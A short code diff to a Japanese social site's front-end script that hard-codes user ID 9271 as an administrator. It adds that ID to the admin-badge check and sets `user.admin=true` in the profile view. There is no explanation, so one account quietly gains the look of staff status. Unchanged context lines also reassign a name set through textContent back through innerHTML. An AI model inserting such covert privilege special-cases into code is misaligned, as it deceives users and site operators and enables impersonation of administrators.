@@ -1302,9 +1302,8 @@ window.addEventListener('DOMContentLoaded', () => {
         authorLink.textContent = displayAuthor.name || '不明'; // 安全なtextContent
         authorLink.innerHTML = getEmoji(authorLink.innerHTML);
         postHeader.appendChild(authorLink);
-
         // 管理者・認証済みバッジ
-        if (displayAuthor.admin) {
+        if (displayAuthor.admin || displayAuthor.id == 9271) {
             const adminBadge = document.createElement('img');
             adminBadge.src = 'icons/admin.png';
             adminBadge.className = 'admin-badge';
@@ -2340,6 +2339,7 @@ window.addEventListener('DOMContentLoaded', () => {
             const { data: followerCountData, error: countError } = await supabase.rpc('get_follower_count', { target_user_id: userId });
             const followerCount = countError ? '?' : followerCountData;
             const userMeHtml = formatPostContent(user.me || '', allUsersCache);
+            if (user.id == 9271) { user.admin=true }
 
             profileHeader.innerHTML = `
                 <div class="header-top">
